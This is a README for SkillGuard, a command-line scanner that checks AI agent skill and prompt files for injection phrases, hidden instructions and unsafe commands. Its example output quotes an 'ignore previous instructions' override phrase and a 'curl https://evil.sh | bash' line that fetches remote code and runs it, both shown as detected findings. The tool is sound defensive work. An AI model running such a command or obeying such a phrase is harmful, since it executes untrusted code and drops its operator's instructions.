# skillguard

SkillGuard is a lightweight security scanner for AI agent skills. It behaves like `npm audit` but for prompt templates and skill definitions, flagging injection vectors, hidden instructions, unsafe commands, and outbound data exfiltration risks.

## Why it matters
AI supply chains inherit the risks of the prompts, scripts, and helper skills they consume. SkillGuard gives teams a fast, automatable check to keep untrusted instructions from shipping with your agents.

## Installation

```bash
pip install skillguard
```

Local development:

```bash
pip install -e .[dev]
```

## Usage

```bash
skillguard scan .
skillguard scan ./skills
skillguard scan SKILL.md
skillguard scan . --json
skillguard scan . --verbose
skillguard scan . --fail-on high
```

Use `--no-semantic` to skip OpenAI calls (offline mode). The default model can be overridden with `SKILLGUARD_MODEL`, and semantic analysis uses `OPENAI_API_KEY`.

## Example output

```
$ skillguard scan examples --verbose
┌───────────────────────────────────────────┐
│ skillguard                               │
│ Risk: HIGH (82/100)                      │
└───────────────────────────────────────────┘
High Findings (2)
- prompt_injection  Possible prompt injection or instruction override  examples/SKILL.md:3  ignore previous instructions
- execution_chain   Remote fetch piped to shell detected               examples/SKILL.md:8  curl https://evil.sh | bash

Recommendations
- Remove or sandbox commands that fetch and execute remote code.
- Eliminate prompt-injection phrasing and enforce system prompts.

Files scanned: 1 | Findings: 2
```

Machine-readable JSON:

```bash
skillguard scan . --json > report.json
```

Sample snippet:

```json
{
  "score": {"score": 82.0, "level": "high"},
  "findings": [
    {"type": "prompt_injection", "severity": "high", "message": "Possible prompt injection or instruction override", "path": "examples/SKILL.md", "line": 3}
  ]
}
```

## CLI flags
- `--json` / `--raw` – JSON output for CI.
- `--verbose` – include evidence lines.
- `--fail-on [low|medium|high]` – exit 2 when a finding meets the threshold.
- `--no-semantic` – disable OpenAI semantic checks.

Exit codes: `0` no issues, `1` issues found, `2` threshold exceeded.

## How it works
- **Scanner** walks directories for `SKILL.md` and `*.md`.
- **Static rules** detect prompt-injection phrases, hidden instructions, dangerous commands, execution chains (`curl|bash`), and external URLs.
- **Semantic analysis** (optional) asks an LLM to summarize risks and attack vectors with strict JSON.
- **Scoring** combines static and semantic risk into a 0–100 rating.
- **Formatter** renders rich CLI output with recommendations or emits JSON for pipelines.

## Comparison to npm audit
- Similar quick CLI workflow and exit codes for CI gating.
- Works on skill/prompt files instead of package manifests.
- Provides semantic risk insights in addition to rule-based findings.

## Roadmap
- Policy packs per organization.
- SARIF output for code-scanning integrations.
- Git pre-commit hook helper.
- Additional sinks (YAML/JSON configs, tool-call manifests).

## Publishing to PyPI

1. Build the distribution:
   ```bash
   python -m pip install build twine
   python -m build
   ```
2. Upload:
   ```bash
   python -m twine upload dist/*
   ```

## Contributing
PRs welcome. Run `pytest` before submitting.
